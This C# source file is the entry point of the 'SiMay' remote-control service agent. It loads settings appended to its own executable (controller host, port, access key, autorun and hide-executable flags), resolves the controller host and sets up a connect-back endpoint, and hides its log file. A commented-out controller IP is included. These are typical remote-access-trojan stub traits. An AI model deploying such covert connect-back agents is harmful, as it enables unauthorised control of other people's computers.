using System;
using System.Collections.Generic;
using System.Net;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using SiMay.Core;
using System.Net.Sockets;
using System.Diagnostics;
using SiMay.Sockets.Tcp.Client;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Delegate;
using System.Text;
using SiMay.Core.Entitys;
using SiMay.Serialize;

namespace SiMay.RemoteService.NewCore
{
    static class Program
    {
        //static string ip = "94.191.115.121";
        //static int port = 522;

        static string ip = "127.0.0.1";
        static int port = 5200;

        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            string remarkInfomation = "SiMayService";//初始化备注信息
            bool isAutoStart = false;
            bool isHide = false;
            int sessionMode = 0;//服务器模式 //1是中间服务器模式
            int accesskey = 5200;//初始连接密码
            string id = "AAAAAAAAAAA11111111";
            bool isMutex = false;

            try
            {
                byte[] binary = File.ReadAllBytes(Application.ExecutablePath);
                var sign = BitConverter.ToInt16(binary, binary.Length - sizeof(Int16));
                if (sign == 9999)
                {
                    var length = BitConverter.ToInt32(binary, binary.Length - sizeof(Int16) - sizeof(Int32));
                    byte[] bytes = new byte[length];
                    Array.Copy(binary, binary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);

                    var options = PacketSerializeHelper.DeserializePacket<ServiceOptions>(bytes);
                    string strlphost = options.Host;
                    int lpport = options.Port;
                    remarkInfomation = options.Remark;
                    isAutoStart = options.IsAutoRun;
                    isHide = options.IsHide;
                    accesskey = options.AccessKey;
                    sessionMode = options.SessionMode;
                    id = options.Id;
                    isMutex = options.IsMutex;
                    while (true) //解析域名,直至解析成功
                    {
                        ip = GetHostByName(strlphost);
                        if (ip != null)
                            break;

                        Console.WriteLine(ip ?? "address analysis is null");

                        Thread.Sleep(5000);
                    }
                    port = lpport;
                }
            }
            catch { }

            if (isMutex)
            {
                //进程互斥体
                bool bExist;
                Mutex MyMutex = new Mutex(true, "SiMayService", out bExist);
                if (!bExist)
                    Environment.Exit(0);
            }


            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            Application.ThreadException += Application_ThreadException;

            AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), port);
            AppConfiguartion.AccessKey = accesskey;
            AppConfiguartion.DefaultRemarkInfo = remarkInfomation;
            AppConfiguartion.IsAutoRun = isAutoStart;
            AppConfiguartion.IsHideExcutingFile = isHide;
            AppConfiguartion.RunTime = DateTime.Now.ToString();
            AppConfiguartion.Version = "正式-5.0";
            AppConfiguartion.IsCentreServiceMode = sessionMode == 1 ? true : false;
            AppConfiguartion.IdentifyId = id;
            try
            {
                new MainService.MainService();
            }
            catch (Exception ex)
            {
                WriteException("main service exception!", ex);
            }

            Application.Run();
        }

        private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
            => WriteException("main thread exception!", e.Exception);

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
            => WriteException("thread exception!", e.ExceptionObject as Exception);

        private static void WriteException(string msg, Exception ex)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine(msg);
            sb.Append(ex.Message);
            sb.Append(ex.StackTrace);

            LogHelper.WriteErrorByCurrentMethod(sb.ToString());

            if (File.Exists("SiMaylog.log"))
                File.SetAttributes("SiMaylog.log", FileAttributes.Hidden);
        }

        private static string GetHostByName(string ip)
        {
            string _return = null;
            try
            {
                IPHostEntry hostinfo = Dns.GetHostByName(ip);
                IPAddress[] aryIP = hostinfo.AddressList;
                _return = aryIP[0].ToString();
            }
            catch { }

            return _return;
        }
    }
}
